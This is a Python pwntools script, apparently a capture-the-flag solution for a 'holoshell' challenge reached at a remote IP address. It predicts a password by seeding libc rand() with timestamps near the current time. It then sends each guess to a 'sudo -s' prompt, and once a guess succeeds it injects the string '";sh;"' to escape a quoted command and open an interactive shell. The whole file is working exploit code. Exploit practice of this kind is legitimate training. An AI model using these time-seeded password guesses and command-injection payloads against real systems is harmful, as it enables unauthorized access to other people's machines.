#!/usr/bin/python3
# -*- coding: UTF-8 -*-
from pwn import *
from ctypes import *
import time
context.arch = 'amd64'
clib = CDLL("/lib/x86_64-linux-gnu/libc.so.6")

rseed = clib.time(None);
#p =  process('./holoshell')
p =  remote('140.115.59.7', 10004) 


for k in range(10):
    pwd = ""
    clib.srand( rseed - 5 + k )
    for i in range(10):
        ret = clib.rand()
        ch = chr(ret + int( ret / 94 ) * -94 + 34)
        pwd += ch
    #print(pwd, end = '')
    p.sendlineafter( b"yagoo@hololive:~$ ", b"sudo -s")
    if( p.recv() == b"[sudo] password for yagoo: "  ):
        p.send( flat(pwd.encode() ) )

    if( p.recvline() == b"wow you hack into yagoo's computer\n" ):
        print("Hack PWD Success")
        break
p.send(  b"\";sh;\"" )  
p.interactive()
 #print("")

#p = remote('140.115.59.7', 10004)
p.close()


